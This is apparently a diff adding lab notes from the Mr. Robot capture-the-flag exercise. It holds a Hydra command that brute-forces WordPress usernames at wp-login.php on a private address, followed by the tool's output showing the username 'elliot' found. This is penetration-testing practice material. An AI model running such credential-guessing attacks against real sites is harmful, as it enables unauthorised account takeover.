@@ -1,0 +1,12 @@
+# hydra -L fsocity.dic_uniq -p test 192.168.100.186 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=redirect_to=https%3A%2F%2F192.168.100.186%2Fwp-admin%2F&testcookie=1:Invalid username" -t 64 -f -v -I
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-06 16:50:16
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 11452 login tries (l:11452/p:1), ~179 tries per task
+[DATA] attacking http-post-form://192.168.100.186:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=redirect_to=https%3A%2F%2F192.168.100.186%2Fwp-admin%2F&testcookie=1:Invalid username
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] 939.00 tries/min, 939 tries in 00:01h, 10513 to do in 00:12h, 64 active
+[STATUS] 916.67 tries/min, 2750 tries in 00:03h, 8702 to do in 00:10h, 64 active
+[80][http-post-form] host: 192.168.100.186   login: elliot   password: test
+
